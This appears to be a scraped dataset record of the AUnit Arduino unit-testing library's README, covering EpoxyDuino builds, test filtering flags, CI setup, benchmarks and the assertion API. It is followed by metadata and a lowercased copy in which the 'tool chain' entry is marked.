EpoxyDuino (https://github.com/bxparks/EpoxyDuino) project. EpoxyDuino provides a minimal Arduino programming environment that is usually sufficient to compile and run AUnit test units on the Unix host machine. It relies on the native C++ compiler, GNU Make, and Makefile files for each *.ino unit test like this:\nAPP_NAME := SampleTest\nARDUINO_LIBS := AUnit\ninclude ../../../EpoxyDuino/EpoxyDuino.mk\nThe unit test is compiled into a binary (SampleTest.out) using the `make command, and the binary can be executed like this:\n$ make\n$ ./SampleTest.out\nHere are a few tips when writing unit tests to run under EpoxyDuino:\nDelay(1000)\nFor real Arduino boards, you get more reliable unit tests if you add a delay(1000) at the start of the program. For EpoxyDuino, this is not necessary, so I recommend calling this only on real Arduino boards, like this:\nvoid setup() {\n#ifdef ARDUINO\ndelay(1000); // Wait for stability on some boards, otherwise garage on Serial\n#endif\n...\nExit() Status Code\nOn real Arduino boards, the unit test (or any program for that matter) never terminates. The loop() function executes forever. On Linux or MacOS using EpoxyDuino, the test program will terminate at the end through the exit() function. If the tests are successful (i.e. passing or skipped), it will call exit(0). If there are any failing tests (i.e. failed or timed out), it will call exit(1).\nCommand Line Flags and Arguments\n(Added in v1.6)\nThe standard Arduino environment does not provide command line arguments, since a microcontroller does not normally provide a command line environment. However, if the AUnit test program is compiled under EpoxyDuino, the standard Unix command line parameters (argc and argv) become available through the extern int epoxy_argc and extern const char* const* epoxy_argv global variables. These allow the TestRunner class to provide command line flags and arguments as follows:\n$ ./test.out --help\nUsage: ./test.out [--help] [--include pattern,...] [--exclude pattern,...]\n[--includesub substring,...] [--excludesub substring,...]\n[--] [substring ...]\nExample, the following runs all tests with substring \"net\" or \"led\" in its name, and skips all others:\n$ ./test.out net led\nFlags:\n--include pattern,...\nComma-separated list of patterns to pass to the TestRunner::include(pattern) method\n--exclude pattern,...\nComma-separated list of patterns to pass to the TestRunner::exclude(pattern) method\n--includesub substring,...\nComma-separated list of substrings to pass to the TestRunner::includesub(substring) method\n--excludesub substring,...\nComma-separated list of substrings to pass to the TestRunner::excludesub(substring) method\nArguments:\nAny Space-separated list of words after the optional flags are passed to the TestRunner::includesub(substring) method.\nThe command line flags and arguments are processed after any hardcoded calls to TestRunner::include() and TestRunner::exclude() methods in the global setup() method.\nThe flags and command line arguments are processed in order of appearance on the command line.\nSimilar to the hardcoded calls to TestRunner::include() and TestRunner::exclude(), if the first command line flag is an --include or --includesub, then all tests are excluded by default initially. Otherwise, the first include flag would have no effect.\nContinuous Integration\nThere are several ways to incorporate AUnit into a continuous integration system. At the infrastructure level, you can use either a system like Jenkins running on a local machine, or use a cloud-based continuous integration system like GitHub Actions. For each of those infrastructures, you can choose to use the Arduino IDE or CLI build tools, or you can use EpoxyDuino to compile and run against a Linux or MacOS environment.\nThe option matrix looks like this:\n+----------------+-------------------------+------------------------+\n|\\ CI environment| | |\n| \\____________ | Local (e.g. Jenkins) | Cloud (e.g. GitHub) |\n| \\ | | |\n| Build tool \\| | |\n+----------------+-------------------------+------------------------+\n| | * can execute tests | * verify compile-only |\n| | on microcontroller | * cannot actually run |\n| Arduino | * complex setup and | tests on |\n| IDE/CLI | * maintenance | microcontroller |\n| | * can be slow | * complex installation |\n| | * (not recommended) | and setup |\n| | | * (unverified) |\n+----------------+-------------------------+------------------------+\n| | * verify execution on | * verify execution on |\n| | Unix environment | Unix environment |\n| EpoxyDuino | * faster than IDE/CLI | * simple setup and |\n| | * complex setup and | maintenance |\n| | and maintenance | * very fast |\n| | * (unnecessary) | * (recommended) |\n+----------------+-------------------------+------------------------+\nArduino IDE/CLI + Cloud\nThe big advantage of using the Arduino IDE/CLI to run the AUnit unit tests is that you can compile them using the precise compiler and tool chain that will be used against the specific microcontroller that you are interested in verifying. There can be subtle compiler differences (e.g. size of int) or differences in how the Arduino programming environment was implemented (e.g. availability of the FPSTR() macro). If you use a cloud-based CI infrastructure, then you must install the complete Arduino IDE/CLI environment into your cloud test runner. Although I think it's theoretically possible, I have never actually verified that this can be done.\nArduino IDE/CLI + Jenkins\nThis setup is described in Continuous Integration with Jenkins, and it worked reasonably well for small number of unit tests. The problem is that the Arduino IDE is far too slow when the number of unit tests become non-trivial. And it also takes too much effort to maintain the local Jenkins infrastructure. The Jenkins environment seems to be brittle due to its complexity of all of its moving parts. This is the only environment where you can connect a real Arduino microcontroller to the local machine and have the unit tests run on the actual microcontroller. Perhaps for certain situations, running the unit tests on actual hardware is a requirement. But for most people, I no longer recommend this environment.\nEpoxyDuino + Jenkins\nOnce the Jenkins environment is up and running, I have verified that it is easy to run the unit tests using EpoxyDuino, since it needs just a C++ compiler and GNU Make. Things will compile and run a lot faster than using the Arduino IDE/CLI. However, this combination suffers from the same problem of maintaining the Jenkins environment. If the unit tests are running in an Unix environment anyway, it seems far easier to just run them in the cloud. So I don't recommend using this setup. Just use a cloud CI provider as described below.\nEpoxyDuino + Cloud (Recommended)\nA cloud-based continuous integration service like GitHub Actions is easy to setup for EpoxyDuino. Often the C++ compiler and GNU make tools are already installed in the Docker container used by the CI system. The only additional setup is to install EpoxyDuino, AUnit and other dependent Arduino libraries.\nHere are some example YAML files for GitHub Actions:\nhttps://github.com/bxparks/AceTime/tree/develop/.github/workflows\nhttps://github.com/bxparks/AceButton/tree/develop/.github/workflows\nhttps://github.com/bxparks/AceRoutine/tree/develop/.github/workflows\nhttps://github.com/bxparks/AceCRC/tree/develop/.github/workflows\nIn the various aunit_tests.yml files, the Setup step installs the various dependent libraries using the git clone command, for example:\ngit clone https://github.com/bxparks/EpoxyDuino\ngit clone https://github.com/bxparks/AUnit\nThese commands install the default branch for those repositories, which for most of my libraries will be the develop branch. This makes sense for me because I want the unit tests to run against the latest commits. However, for many others, it is probably better to use the master branch because it contains the stable releases:\ngit clone --branch master https://github.com/bxparks/EpoxyDuino\ngit clone --branch master https://github.com/bxparks/AUnit\nUsing EpoxyDuino with a cloud CI provider (like GitHub Actions) is my recommended configuration for running AUnit tests because it is easy to setup and maintain and the tests run fast.\nTips\nCollection of useful tidbits.\nDebugging Assertions in Fixtures\nWhen using test fixtures with the testF() and testingF() macros, it's often useful to create helper assertions, such as the assertCustomStuff() below. Debugging such assertion statements can be tricky. I've found that turning on messages for successful assertions (with a enableVerbosity(Verbosity::kAssertionPassed)) statement can be very helpful:\nclass CustomTestOnce: public TestOnce {\nprotected:\n// optional\nvoid setup() override {\nTestOnce::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\nTestOnce::teardown();\n}\nvoid assertCustomStuff() {\nassertEqual(...);\n...\nfor (...) {\n...\nassertEqual(...);\n...\n}\n}\nint sharedValue;\n};\ntestF(CustomTestOnce, calculate) {\nenableVerbosity(Verbosity::kAssertionPassed);\n...test code here...\nassertCustomStuff();\n}\nClass Hierarchy\nTo support test fixtures in a more natural way, the class hierarchy in AUnit is slightly different than ArduinoUnit. In ArduinoUnit we have a two level hierarchy:\nTest ::loop()\n^\n|\nTestOnce ::once()\nIn AUnit, the functionality that supports the testing() macro has been migrated to a separate class called TestAgain, like this:\nTest ::loop()\n^\n|\nAssertion\n^\n|\nMetaAssertion\n^ ^\n/ \\\n/ \\\nTestAgain TestOnce\n::again() ::once()\nNormally, deep inheritance hierarchies like this should be avoided. However, placing the Assertion and MetaAssertion classes inside the Test hierarchy allowed those assertion statements to have access to the internal states of the Test instance. This made certain features (like the early return upon delayed failure) slightly easier to implement. For the most part, the end-users can ignore the existence of the Assertion and MetaAssertion classes and think of this as a simple 2-level inheritance tree.\nTesting Private Helper Methods\nThere is a school of thought which says that unit tests should test only the publically exposed methods of a class or library. I agree mostly with that sentiment, but not rigidly. I think it is sometimes useful to write unit tests for protected or private methods. For example, when creating a chain of small helper methods, which build up to larger publically exposed methods, it is extremely useful to write unit tests for the helper methods in isolation.\nNormally those helper methods would be private because they are used only within that class, and we don't want to expose them to the public API. One option is to make them public but add a comment in the function to say that it is exposed only for testing purposes. This does not seem satisfactory because users will tend to ignore such comments if the helper functions are useful.\nI think a better way is to keep the helper functions private but make the unit tests a friend class of the target class. The syntax for doing this can be tricky, it took me a number of attempts to get this right, especially if when using namespaces for the target class:\n//------------------- Target.h -------------\n// Auto-generated test class names.\nclass Test_helper;\nclass TargetSuite_helper;\nclass TargetTest_helper;\nnamespace mylib {\nclass Target {\npublic:\nvoid publicMethod() {\n...\nint a = helper();\n...\n}\nprivate:\n// Must have the global scope operator '::'\nfriend class ::Test_helper;\nfriend class ::TargetSuite_helper;\nfriend class ::TargetTest_helper;\nstatic int helper() {...}\n};\n}\n//------------------- TargetTest.ino -------------\n#include <AUnit.h>\n#include \"Target.h\"\nusing namespace aunit;\nusing namespace mylib;\ntest(helper) {\nassertEqual(1, Target::helper(...));\n}\ntest(TargetSuite, helper) {\nassertEqual(1, Target::helper(...));\n}\nclass TargetTest: public TestOnce {\n...\n};\ntestF(TargetTest, helper) {\nassertEqual(1, Target::helper(...));\n}\nThe tricky part is that Target.h must have forward declarations of the various auto-generated AUnit test classes. And within the Target class itsef, the friend declarations need to have a global scope :: specifier before the name of the test class.\nBenchmarks\nAUnit consumes as much as 65% less flash memory than ArduinoUnit 2.2 on an AVR platform (e.g. Arduino UNO, Nano), and 30% less flash on the Teensy-ARM platform (e.g. Teensy LC ). (ArduinoUnit 2.3 reduces the flash memory by 30% or so, which means that AUnit can still consume significantly less flash memory.)\nHere are the resource consumption (flash and static) numbers from AceButtonTest containing 26 test cases using 331 assertXxx() statements, compiled using AUnit and ArduinoUnit 2.2 on 5 different microcontrollers:\n---------------------------+---------+-------------+-------------+\nPlatform (resource) | Max | ArduinoUnit | AUnit |\n---------------------------+---------+-------------+-------------|\nArduino Nano (flash) | 30720 | 54038 | 18928 |\nArduino Nano (static) | 2048 | 1061 | 917 |\n---------------------------+---------+-------------+-------------|\nTeensy LC (flash) | 63488 | 36196 | 26496 |\nTeensy LC (static) | 8192 | 2980 | 2780 |\n---------------------------+---------+-------------+-------------|\nTeensy 3.2 (flash) | 262144 | 51236 | 37920 |\nTeensy 3.2 (static) | 65536 | 5328 | 5236 |\n---------------------------+---------+-------------+-------------|\nESP8266 - ESP-12E (flash) | 1044464 | does not | 268236 |\nESP8266 - ESP-12E (static) | 81920 | compile | 33128 |\n---------------------------+---------+-------------+-------------|\nESP8266 - ESP-01 (flash) | 499696 | does not | 268236 |\nESP8266 - ESP-01 (static) | 47356 | compile | 33128 |\n---------------------------+---------+-------------+-------------+\nNot all unit test sketches will experience a savings of 65% of flash memory with AUnit, but a savings of 30-50% seems to be common.\nSystem Requirements\nHardware\nThe library is tested on the following boards:\nArduino Nano clone (16 MHz ATmega328P)\nSparkFun Pro Micro clone (16 MHz ATmega32U4)\nSAMD21 M0 Mini board (Arduino Zero compatible, 48 MHz ARM Cortex-M0+)\nSTM32 Blue Pill (STM32F103C8, 72 MHz ARM Cortex-M3)\nNodeMCU 1.0 (ESP-12E module, 80 MHz ESP8266)\nWeMos D1 Mini (ESP-12E module, 80 MHz ESP8266)\nESP32 dev board (ESP-WROOM-32 module, 240 MHz dual core Tensilica LX6)\nTeensy 3.2 (96 MHz ARM Cortex-M4)\nI will occasionally test on the following hardware as a sanity check:\nMini Mega 2560 (Arduino Mega 2560 compatible, 16 MHz ATmega2560)\nTeensy LC (48 MHz ARM Cortex-M0+)\nThe following boards are not supported:\nAny platform using the ArduinoCore-API (https://github.com/arduino/ArduinoCore-api), such as:\nmegaAVR (e.g. Nano Every) using ArduinoCore-megaavr (https://github.com/arduino/ArduinoCore-megaavr/)\nSAMD21 boards (e.g. MKRZero) using ArduinoCore-samd (https://github.com/arduino/ArduinoCore-samd) starting with arduino:samd version >= 1.8.10\nRaspberry Pi Pico (RP2040) using Arduino-Pico (https://github.com/earlephilhower/arduino-pico)\nTool Chain\nThis library was validated using:\nArduino IDE 1.8.13\nArduino CLI 0.14.0\nArduino AVR Boards 1.8.3\nArduino SAMD Boards 1.8.9\nSparkFun AVR Boards 1.1.13\nSparkFun SAMD Boards 1.8.1\nSTM32duino 2.0.0\nESP8266 Arduino 2.7.4\nESP32 Arduino 1.0.6\nTeensyduino 1.54\nThis library is not compatible with:\nAny platform using the ArduinoCore-API, for example:\nArduino SAMD Boards >=1.8.10\nArduino megaAVR\nMegaCoreX\n(See Issue #56 and Issue #66).\nIt should work with PlatformIO but I have not tested it extensively.\nOperating System\nI use Ubuntu 20.04 for the vast majority of my development. I expect that the library will work fine under MacOS and Windows, but I have not tested them.\nLicense\nMIT License\nFeedback and Support\nIf you have any questions, comments, or feature requests for this library, please use the GitHub Discussions for this project. If you have bug reports, please file a ticket in GitHub Issues. Feature requests should go into Discussions first because they often have alternative solutions which are useful to remain visible, instead of disappearing from the default view of the Issue tracker after the ticket is closed.\nPlease refrain from emailing me directly unless the content is sensitive. The problem with email is that I cannot reference the email conversation when other people ask similar questions later.\nAuthors\nCreated by Brian T. Park (brian@xparks.net).\nThe Google Test adapter (gtest.h) was created by Chris Johnson (chrisjohnsonmail@gmail.com).\n@brewmanz increased the maximum allowed value of TestRunner::setTimeout() from 255 seconds to 65535 seconds (18.2 hours). (See Issue #57).\nThe design and syntax of many macros (e.g. test(), assertXxx()) were borrowed from the ArduinoUnit project to allow AUnit to be almost a drop-in replacement. Many thanks to the ArduinoUnit team for creating such an easy-to-use API.", "link": "https://github.com/bxparks/AUnit", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "aunit\na unit testing framework for arduino platforms inspired by by arduinounit and google test. the unit tests usually run on the embedded controller which allows detection of architecture-specific problems. but for faster development, many unit tests can be compiled and executed natively on linux or macos using the epoxyduino companion project.\naunit is almost a drop-in replacement of arduinounit with some advantages. aunit supports timeouts and test fixtures. it sometimes consumes 50% less flash memory on the avr platform, and it has been tested to work on the avr, samd21, stm32, esp8266, esp32 and teensy platforms. another companion project auniter project provides command line tools to verify, upload and validate the unit tests to the microcontroller, instead of having to go through the arduino ide. both the auniter and epoxyduino tools can be used in a continuous integration system like jenkins, or with github actions.\nversion: 1.6 (2021-11-02)\nchangelog: changelog.md\ntable of contents\nsummary\narduinounit compatible features\nmissing features\nadded features\ninstallation\nsource code\ndocumentation\nexamples\nusage\nheader and namespace\nverbose mode\ndefining the tests\ngenerated class and instance names\nbinary assertions\nsupported parameter types\nparameter types must match\npointer comparisons\ncase insensitive string comparisons\napproximate comparisons\nboolean assertions\ntest fixtures\nearly return and delayed assertions\nmeta assertions\nunconditional termination\noverridable methods\nrunning the tests\nfiltering test cases\noutput printer\ncontrolling verbosity\nline number mismatch\ntest framework messages\nassertion message\nverbose mode message\ntest case summary\ntest runner summary\ntest timeout\ngoogletest adapter\ncommand line tools\nauniter\nepoxyduino\ncommand line flags and arguments\ncontinuous integration\narduino ide/cli + cloud\narduino ide/cli + jenkins\nepoxyduino + jenkins\nepoxyduino + cloud (recommended)\ntips\ndebugging assertions in fixtures\nclass hierarchy\ntesting private helper methods\nbenchmarks\nsystem requirements\nhardware\n-----> tool !!!  chain\noperating system\nlicense\nfeedback and support\nauthors\nsummary\naunit was created to solve 3 problems with arduinounit 2.2:\narduinounit consumes too much flash memory on an avr platform (e.g. arduino uno, nano) as explained in arduinounit#70.\narduinounit does not compile on the esp8266 platform (see arduinounit#68, arduinounit#55, arduinounit#54).\narduinounit does not provide an easy way to create tests using fixtures, equivalent to the test_f() macro in google test.\nin contrast:\naunit consumes as much as 65% less flash memory than arduinounit 2.2 on the avr platform. on teensy-arm, the savings can be as much as 30%.\naunit has been tested on avr, teensy-arm and esp8266.\naunit implements the testf() and testingf() macros to use fixtures.\nthe auniter command line tools can compile the unit tests, upload them to arduino boards attached to the serial ports of the local machine, and validate the output of the aunit test runner. in addition, the auniter script can be integrated into a jenkins continuous integration service running on the local machine, and the unit tests can be monitored automatically.\nunit tests written using aunit can often be compiled and executed natively on linux or macos using the epoxyduino library. the output on the serial object is redirected to the stdout of the unix host. this provides another avenue for implementing continuous builds or integration.\narduinounit compatible features\nfor basic unit tests written using arduinounit 2.2, only two changes are required to convert to aunit:\n#include <arduinounit.h> -> #include <aunit.h>\ntest::run() -> aunit::testrunner::run()\nmost of the core macros are compatible between arduinounit and aunit:\ntest()\ntesting()\nassertxxx()\nmeta assertions\nchecktestxxx()\nasserttestxxx()\nexterntest()\nexterntesting()\naunit also supports exclude and include filters:\ntestrunner::exclude()\ntestrunner::include()\nthe various assertion and test status messages can be enabled or disabled using the verbosity flags on per test basis:\nenableverbosity()\ndisableverbosity()\nmissing features\nhere are the features which have not been ported over from arduinounit 2.2:\narduinounit supports multiple * wildcards in its exclude() and include() methods. aunit supports only a single * wildcard and it must occur at the end if present.\nadded features\nhere are the features in aunit which are not available in arduinounit 2.2:\nconfigurable timeout parameter to prevent testing() test cases from running forever:\ntestrunner::settimeout(seconds)\ntest::expire()\nasserttestexpire()\nasserttestnotexpire()\nchecktestexpire()\nchecktestnotexpire()\ncase-insensitive string comparisons:\nassertstringcaseequal()\nassertstringcasenotequal()\napproximate comparisons:\nassertnear()\nasssertnotnear()\nsupports 64-bit integer\nassertxxx() support both long long and unsigned long long\ntest() and testing() macros support both 1 and 2 arguments\ntest(testname) and test(suitename, testname)\ntesting(testname) and testing(suitename, testname)\ntest fixtures using the \"f\" variations of existing macros:\ntestf()\ntestingf()\nasserttestxxxf()\nchecktestxxxf()\nexterntestf()\nexterntestingf()\nunconditional termination:\npasstestnow()\nfailtestnow()\nskiptestnow()\nexpiretestnow()\nteardown() method which mirrors the setup() method:\nteardown()\ntest filters support 2-arguments, matching testf() and testingf():\ntestrunner::include(testclass, name)\ntestrunner::exclude(testclass, name)\nno dynamic allocation of heap memory:\nthe library does not create a string object.\nit reads from a string if the calling code provides it.\nterse and verbose modes:\n#include <aunit.h> - terse messages use less flash memory\n#include <aunitverbose.h> - verbose messages use more flash memory\nevery feature of aunit is unit tested using aunit itself.\ninstallation\nthe latest stable release is available in the arduino ide library manager. search for \"unit test\" or \"aunit\", select \"aunit\", then click the \"install\" button.\nthe development version can be installed by cloning the github repository, checking out the develop branch, then manually copying over the contents to the ./libraries directory used by the arduino ide. (the result is a directory named ./libraries/aunit.) see the preferences menu for the location of the arduino sketch directory. the master branch contains the stable release.\nusing either installation method, you may need to restart the arduino ide to pick up the new library.\nsource code\nthe source files are organized as follows:\nsrc/aunit.h - main header file\nsrc/aunitverbose.h - verbose version of main header file\nsrc/aunit/ - all implementation files\ntests/ - unit tests written using aunit itself\nexamples/ - example sketches\ndocumentation\nreadme.md - this file\ndoxygen docs published on github pages can help navigate the classes and header files\nexamples\nthe examples/ directory has a number of examples:\nadvanced - how to subclass test and testonce manually\nbasic - using the test() macro\ncontinuous - using the testing() macro\nfilter - how to filter tests using testrunner::include() and testrunner::exclude()\nfixture - how to use the testf() macro with test fixtures\nmeta_asserts - how to use asserttestxxx() and checktestxxx()\nin the tests/ directory:\naunittest - the unit test for core aunit functions,\naunitmetatest - the unit test for meta assertions and extern*() macros\nfiltertest - manual tests for include() and exclude() filters\nsetupandteardowntest - tests to verify that setup() and teardown() are called properly by the finite state machine\nperhaps the best way to see aunit in action through real life examples. i currently have 3 arduino project using aunit extensively (look under the tests/ directory in each project).\nacebutton\noriginally created using arduinounit 2.2, and i have kept those tests backwards compatible. they do not use the new features of aunit.\naceroutine\ndemonstrates the full power of aunit better.\nacetime\ndemonstrates the full power of aunit better.\nusage\nin this section, information about differences between aunit and arduinounit will appear in a note marked by arduinounit compatibility.\nheader and namespace\nto prevent name clashes with other libraries and code, all classes in the aunit library are defined in the aunit namespace. the user will mostly interact with the testrunner class. it can be referenced with an explicit namespace qualifier (i.e. aunit::testrunner), or we can use a using directive like this:\n#include <aunit.h>\nusing aunit::testrunner;\nor we can import the entire aunit namespace:\n#include <aunit.h>\nusing namespace aunit;\nsimilar to arduinounit, many of the \"functions\" in this framework (e.g. test(), testing(), assertxxx()) are defined as #define macros which live in the global namespace, so it is usually not necessary to import the entire aunit namespace.\nverbose mode\nby default, aunit generates terse assertion messages by leaving out the string arguments of the various assertxxx() macros. if you would like to get the same verbose output as arduinounit, use the following header instead:\n#include <aunitverbose.h>\nthe flash memory consumption on an 8-bit avr may go up by 20-25% for medium to large tests. on teensy arm, esp8266 or esp32, the increased memory size probably does not matter too much because these microcontrollers have far more flash and static memory.\ndefining the tests\nthe usage of aunit is basically identical to arduinounit. the following macros are used to create a test:\ntest(name) {...} - creates a subclass of testonce\ntesting(name) {...} - creates a subclass of testagain\ntest(suitename, name) {...} - creates a subclass of testonce\ntesting(suitename, name) {...} - creates a subclass of testagain\ntestf(classname, name) {...} - creates a subclass of classname\ntestingf(classname, name) {...} - creates a subclass of classname\nthe code in { } following these macros becomes the body of a method in a subclass derived from the base class indicated above. the test() and testf() macros place the code body into the testonce::once() method. the testing() and testingf() macros place the code body into the testagain::again() method.\nthe test() and testing() macros support 1 or 2 arguments. the one-argument version is inherited from arduinounit. the two-argument version is analogous to the test() macro in googletest, where the suitename can be used to organize multiple tests into a collection of similar tests. the grouping is purely in the naming scheme of the generated code, there is no functional relationship between these tests.\nduring static initialization, the constructor of the object adds itself to an internal list. the root of that list is given by test::getroot(). the testrunner::run() method traverses the linked list, executing each test case until it passes, fails or is skipped.\nhere is a rough outline of an aunit unit test sketch:\n#line 2 aunittest.ino\n#include <aunit.h>\nusing namespace aunit;\ntest(example) {\n...\nassertxxx(...)\n...\n}\ntest(exampletest, example) {\n...\n}\ntesting(looping) {\n...code...\nif (...) {\npass();\n} else if (...) {\nfailtestnow();\n} else {\nskiptestnow();\n}\n}\ntesting(loopingtest, looping) {\n...\n}\nclass customtestonce: public testonce {\nprotected:\n// optional\nvoid setup() override {\ntestonce::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\ntestonce::teardown();\n}\nvoid assertbigstuff() {\n...higher level assertions...\n}\n};\ntestf(customtestonce, example_test) {\n...\nassertbigstuff();\n...\n}\nclass customtestagain: public testagain {\nprotected:\n// optional\nvoid setup() override {\ntestagain::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\ntestagain::teardown();\n}\nvoid assertbigstuff() {\n...various assertions...\n}\n};\ntestingf(customtestagain, example_test) {\n...\nassertbigstuff();\n...\n}\nvoid setup() {\nserial.begin(115200);\nwhile (! serial); // wait until serial is ready - leonardo/micro\ntestrunner::exclude(\"*\");\ntestrunner::include(\"looping*\");\ntestrunner::include(\"customtestagain\", \"example*\");\n}\nvoid loop() {\ntestrunner::run();\n}\narduinounit compatibility: the basic structure of the unit test is identical to arduinounit. aunit adds the testf() and testingf() macros, and the two-argument versions of test() and testing() which are not available in arduinounit. the test class in arduinounit has been replaced with the testagain class in aunit.\ngenerated class and instance names\nthe arguments to the various test*() macros are used to generate the name for the subclasses of testonce or testagain, and generate the names of the instances of those classes. for reference, here are the rules:\ntest(name)\nclass: \"test_\" + name\ninstance: \"test_\" + name + \"_instance\"\ntesting(name)\nclass: \"test_\" + name\ninstance: \"test_\" + name + \"_instance\"\ntest(suitename, name)\nclass: suitename + \"_\" + name\ninstance: suitename + \"_\" + name + \"_instance\"\ntesting(suitename, name)\nclass: suitename + \"_\" + name\ninstance: suitename + \"_\" + name + \"_instance\"\ntestf(classname, name)\nclass: classname + \"_\" + name\ninstance: classname + \"_\" + name + \"_instance\"\ntestingf(classname, name)\nclass: classname + \"_\" + name\ninstance: classname + \"_\" + name + \"_instance\"\nthe instance name is available within the test code using the test::getname() method.\nbinary assertions\ninside the test() and testing() macros, the following assertions are available. these are essentially identical to arduinounit:\nassertequal(a, b)\nassertnotequal(a, b)\nassertless(a, b)\nassertmore(a, b)\nassertlessorequal(a, b)\nassertmoreorequal(a, b)\nsupported parameter types\nthe 6 core assert macros (assertequal(), assertnotequal(), assertless(), assertmore(), assertlessorequal(), assertmoreorequal()) support the following 18 combinations for their parameter types:\n(bool, bool)\n(char, char)\n(int, int)\n(unsigned int, unsigned int)\n(long, long)\n(unsigned long, unsigned long)\n(long long, long long)\n(unsigned long long, unsigned long long)\n(double, double)\n(const char *, const char *)\n(const char *, const string&)\n(const char *, const __flashstringhelper*)\n(const string&, const char*)\n(const string&, const string&)\n(const string&, const __flashstringhelper*)\n(const __flashstringhelper*, const char*)\n(const __flashstringhelper*, const string&)\n(const __flashstringhelper*, const __flashstringhelper*)\nthe assertequal() and assertnotequal() support arbitary pointer types through implicit casts to const void*:\n(const void*, const void*) (since v1.4)\nall 9 combinations of the 3 string types (char*, string, and __flashstringhelper*) are supported.\nthese macros perform deep comparisons for string types instead of just comparing their pointer values. this is different than the assert_eq() and assert_ne() macros in google test which perform only pointer comparisons. in other words, assertequal() with string types is equivalent to assert_streq() in google test.\nalso for string types, these macros support nullptr (unlike the underlying strcmp() function from the c-library). the nullptr string is defined to be \"smaller\" than any non-null string, including the empty string. two nullptr strings are considered to be equal however.\nadditionally, the usual c++ implicit type conversion and function overloading matching algorithms apply to support additional argument types. for example, the following type conversions will occur:\nsigned char -> int\nunsigned char -> int\nshort -> int\nunsigned short -> int or unsigned int (depending on sizeof(int))\nchar* -> const char*.\nchar[n] -> const char*\nfloat -> double\npointer types -> const void*\nnote that char, signed char, and unsigned char are 3 distinct types in c++, so a (char, char) will match exactly to one of the assertxxx() methods.\narduinounit compatibility: the names of the macros are identical. however, the type inference logic of two (a, b) arguments in the assertxxx(a, b) is slightly different. arduinounit allows the two parameters to be slightly different types, at the expense of a compiler warning. in aunit, the warning becomes a compiler error. see the \"parameters must match types\" section below.\nparameter types must match\nin arduinounit, the assertxxx() macros could be slightly different types, for example:\nunsigned int uintvalue = 5;\nassertequal(5, uintvalue);\nif the compiler warnings are enabled in the preferences box of the ide, a warning from the compiler is printed:\n../arduinounit/src/arduinounitutility/compare.h:17:28: warning:\ncomparison between signed and unsigned integer expressions [-wsign-compare]\nreturn (!(a<b)) && (!(b<a));\nin aunit, the above code produces a compiler error (not a warning) like this:\n.../aunit/src/aunit/assertion.h:29:66: error: call of overloaded\n'assertion(const char [14], int, int, const char[3], <unresolved overloaded\nfunction type>, unsigned int&)' is ambiguous\nif (!aunit::assertion(__file__,__line__,(arg1),opname,op,(arg2)))\\\n...\nthe compiler cannot find an appropriate overloaded version of assertequal().\nthe solution is to make the parameters the same type:\nassertequal(5u, uintvalue);\non the avr platform, both a (short) and (int) are 16-bit types, so the following will produce a compiler error:\nunsigned short ushortvalue = 5;\nassertequal(5u, ushortvalue);\nbut on teensy-arm, esp8266, and esp32, a 16-bit (short) can be promoted to a 32-bit (int) without loss of precision, so the above will compile just fine. for portability, the following should be used on all platforms:\nunsigned short ushortvalue = 5;\nassertequal((unsigned short) 5, ushortvalue);\nthe integer type promotion rules and function overload matching rules can be difficult to remember (and sometimes difficult to understand). the best way to avoid these compiler errors is to make sure that the assertion parameter types are identical, potentially using explicit casting.\npointer comparisons\nversion 1.4 adds pointer comparison to assertequal() and assertnotequal(). arbritary pointers are implicitly cast to a const void* and compared to each other. if the assertion fails, the pointer is converted to an integer type, and the hexadecimal value of the pointer is printed. for example,\ntest(voidpointer) {\nconst int aa[] = {1, 2};\nconst long bb[] = {1, 2};\nassertequal(aa, bb);\n}\nthis test will fail with the following error message:\nassertion failed: (aa=0x3fffff38) == (bb=0x3fffff30), file aunittest.ino, line 338.\ntest voidpointer failed.\ncomparison against the nullptr will work:\ntest(nullpointer) {\nconst int aa[] = {1, 2};\nassertequal(aa, nullptr);\n}\nthis will print the following:\nassertion failed: (aa=0x3fffff58) == (nullptr=0x0), file aunittest.ino, line 348.\ntest nullpointer failed.\ncomparing a string type (i.e. const char*, or const __flashstringhelper*) to a nullptr will cause an error due to ambiguous matches on overloaded functions. the solution is to explicitly cast the nullptr to the corresponding string type:\ntest(stringpointer) {\nconst char aa[] = \"abc\";\n// assertequal(aa, nullptr); // causes errors\nassertequal(aa, (const char*) nullptr); // works.\n}\ncase insensitive string comparisons\ntwo macros provide case-insensitive string comparisons (analogous to assert_strcaseeq() and assert_strcasene() in google test):\nassertstringcaseequal(a, b)\nassertstringcasenotequal(a, b)\nthe supported types for (a, b) are all 9 combinations of arduino string types:\n(const char *, const char *)\n(const char *, const string&)\n(const char *, const __flashstringhelper*)\n(const string&, const char*)\n(const string&, const string&)\n(const string&, const __flashstringhelper*)\n(const __flashstringhelper*, const char*)\n(const __flashstringhelper*, const string&)\n(const __flashstringhelper*, const __flashstringhelper*)\narduinounit compatibility: not available in arduinounit.\napproximate comparisons\nfloating point values are difficult to compare because of internal rounding errors. google test provides two types of macros to handle floating points:\nassert_float_eq(a, b), assert_double_eq(a, b) - determine if the floating point numbers are within 4 units in the last place (ulps)\nassert_near(a, b, error) - determine if the absolute distance between a and b is within the given error\nsince floating point operations are relatively rare in arduino programming, aunit offers only the equivalent of assert_near() function:\nassertnear(a, b, error)\nassertnotnear(a, b, error)\nupon failure, the error messages will look something like:\nassertion failed: |(1.00) - (1.10)| > (0.20), file aunittest.ino, line 517.\nassertion failed: |(4.00) - (1.10)| <= (0.20), file aunittest.ino, line 527.\nunlike google test where assert_near() supports only the double type, both assertnear() and assertnotnear() support integral types as well. the full list of supported types is:\nint\nunsigned int\nlong\nunsigned long\ndouble\nother primitive types (e.g. char or float) will be automatically converted to one of these supported types by the compiler. (64-bit integer types long long and unsigned long long are not supported here.)\nnote that the abs() of 2 values of a signed integer type can be larger than the maximum value that can be represented by the given signed type. since signed integer overflow is an undefined behavior in c and c++11, i cannot predict what the compiler will do in that case. unsigned types should not have this problem because the distance between two values of an unsigned type should always fit inside the given unsigned type. technically, a similar problem exists for the floating point types (which are naturally signed), but it is unlikely that you are dealing with floating point values so close to the maximum values.\nboolean assertions\nthe following boolean asserts are also available:\nasserttrue(condition)\nassertfalse(condition)\narduinounit compatibility: these are identical to arduinounit.\ntest fixtures\nwhen the unit tests become more complex, using test fixtures will allow 